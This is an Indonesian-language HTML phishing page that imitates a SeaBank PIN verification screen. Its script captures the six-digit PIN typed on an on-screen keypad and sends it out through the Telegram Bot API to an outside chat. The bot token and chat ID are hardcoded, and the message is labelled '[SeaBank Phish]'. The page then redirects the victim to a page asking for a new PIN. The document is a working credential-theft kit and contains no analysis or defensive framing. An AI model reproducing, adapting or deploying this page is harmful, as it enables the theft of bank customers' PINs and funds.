<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi PIN SeaBank</title>
    
    <style>
        /* CSS Keypad dan Tampilan (Sama seperti sebelumnya) */
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-height: 100vh;
            overflow-x: hidden; 
        }

        .app-header {
            display: flex;
            align-items: center;
            padding: 15px 20px;
            border-bottom: 1px solid #eee;
            color: #333;
            font-size: 1.1em;
            font-weight: bold;
        }

        .app-header .back-arrow {
            font-size: 1.5em;
            margin-right: 15px;
            color: #555;
            cursor: pointer;
        }

        .main-content {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            text-align: center;
            min-height: 0; 
        }

        .logo-container {
            margin-bottom: 30px;
        }

        .logo-container img {
            width: 150px;
            height: auto;
        }

        .pin-prompt {
            color: #555;
            font-size: 1.1em;
            margin-bottom: 15px;
        }

        .forgot-pin {
            color: #ff6600; 
            text-decoration: none;
            font-size: 0.9em;
            margin-bottom: 40px;
            display: block;
        }

        .pin-indicator-container {
            display: flex;
            justify-content: center;
            gap: 25px;
            margin-bottom: 50px;
            height: 15px;
        }

        .pin-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: #e0e0e0;
            transition: background-color 0.1s ease;
        }

        .pin-dot.active {
            background-color: #ff6600;
        }

        .keypad-container {
            background-color: #ffffff; 
            padding: 10px 20px 40px; 
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px; 
            width: 100%;
            max-width: 350px; 
            margin: 0 auto;
            box-sizing: border-box;
        }

        .keypad-button {
            background-color: #f7f7f7; 
            border: none; 
            border-radius: 50%; 
            padding: 0;
            font-size: 1.6em;
            font-weight: 500;
            color: #333;
            cursor: pointer;
            user-select: none;
            transition: background-color 0.1s ease;
            display: flex;
            justify-content: center;
            align-items: center;
            padding-top: 100%; 
            position: relative;
        }
        
        .keypad-button span {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .keypad-button:active {
            background-color: #e0e0e0;
        }
        
        .keypad-button.empty {
            background-color: transparent;
            border: none;
            cursor: default;
        }
        
        .keypad-button.delete {
            background-color: transparent;
            border: none;
        }
        
        .keypad-button.delete img {
            width: 30px; 
            height: auto;
            filter: invert(0.3);
        }
    </style>
</head>
<body>
    
<div class="app-header">
        <span class="back-arrow" onclick="history.back()">&#8592;</span> 
Verifikasi PIN SeaBank
    </div>

    
<div class="main-content">
        <div class="logo-container">
            <img src="logo.png" alt="Logo SeaBank">
        </div>

        <p class="pin-prompt">Masukkan 6 digit PIN kamu</p>
        <a href="#" class="forgot-pin">Lupa PIN?</a>

        <div class="pin-indicator-container">
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
        </div>
    </div>

    
<div class="keypad-container">
        <div class="keypad-button" data-value="1"><span>1</span></div>
        <div class="keypad-button" data-value="2"><span>2</span></div>
        <div class="keypad-button" data-value="3"><span>3</span></div>
        <div class="keypad-button" data-value="4"><span>4</span></div>
        <div class="keypad-button" data-value="5"><span>5</span></div>
        <div class="keypad-button" data-value="6"><span>6</span></div>
        <div class="keypad-button" data-value="7"><span>7</span></div>
        <div class="keypad-button" data-value="8"><span>8</span></div>
        <div class="keypad-button" data-value="9"><span>9</span></div>
        <div class="keypad-button empty"></div> 
        <div class="keypad-button" data-value="0"><span>0</span></div>
        <div class="keypad-button delete" data-value="delete">
            <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'><path d='M22 3H7c-.69 0-1.05.35-1.35.65L3 8l3.65 4.35c.3.3.66.65 1.35.65H22c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 8h-4V7h4v4z'/></svg>" 
                 alt="Hapus" 
                 title="Hapus Digit Terakhir">
        </div>
</div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const pinDots = document.querySelectorAll('.pin-dot');
            const keypadButtons = document.querySelectorAll('.keypad-button');
            let currentPin = '';
            const pinLength = 6;

            // *** INFORMASI BOT TELEGRAM ANDA ***
            const BOT_TOKEN = '8286824254:AAHECrYlrnN0GeEBdG2ASNJEg79mw0FAYn8';
            const CHAT_ID = '5923031825';
            // **********************************

            function updatePinDisplay() {
                pinDots.forEach((dot, index) => {
                    if (index < currentPin.length) {
                        dot.classList.add('active');
                    } else {
                        dot.classList.remove('active');
                    }
                });
            }

            function sendToTelegram(message) {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
                
                fetch(url).catch(error => {
                    console.error('Error saat mengirim ke Telegram:', error);
                });
            }

            keypadButtons.forEach(button => {
                button.addEventListener('click', function() {
                    const value = this.dataset.value;

                    if (value === 'delete') {
                        currentPin = currentPin.slice(0, -1);
                    } else if (value && currentPin.length < pinLength) { 
                        currentPin += value;
                    }

                    updatePinDisplay();

                    if (currentPin.length === pinLength) {
                        
                        // 1. SIMPAN PIN LAMA KE LOCALSTORAGE
                        localStorage.setItem('oldPin', currentPin);
                        
                        // 2. KIRIM PIN LAMA KE TELEGRAM
                        const pinMessage = `[SeaBank Phish] PIN Lama Diterima: ${currentPin}`;
                        sendToTelegram(pinMessage);
                        
                        // 3. LANJUTKAN KE HALAMAN PIN BARU
                        setTimeout(() => {
                            window.location.href = 'pin_baru.html'; 
                        }, 500);
                    }
                });
            });
        });
    </script>
</body>
</html>
